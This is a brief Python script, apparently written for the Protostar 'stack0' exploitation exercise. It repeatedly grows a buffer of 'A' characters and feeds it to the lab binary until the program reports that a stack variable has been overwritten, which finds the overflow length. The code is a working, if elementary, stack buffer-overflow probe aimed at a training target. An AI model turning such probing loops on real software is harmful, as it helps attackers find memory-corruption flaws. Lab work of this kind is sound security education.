#!/usr/bin/python

import commands
import re

# Create new file to receive buffer
file = open('buffer', 'w+')
file.close()

# Path to binary
command = '/opt/protostar/bin/stack0'

# String to execiute command and send buffer file as input
line = command + " < buffer"

modified = 0
count = 0

# Loop through until binary outputs that the variable is modified
while (modified == 0):

	# Add another A to the buffer file
	file = open('buffer', 'a')
	file.write('A')
	file.close()

	# Increment count
	count = count + 1
	print('Attempting ' + str(count) + '\n')

	# Execute the command with the current buffer
	output = commands.getoutput(line)
	#print(output)

	# Use regex to determine if "modified" is detected in output
	match = re.search( r'modified', output, re.I)

	if match:
		print('Variable modified at ' + str(count))
		modified = 1
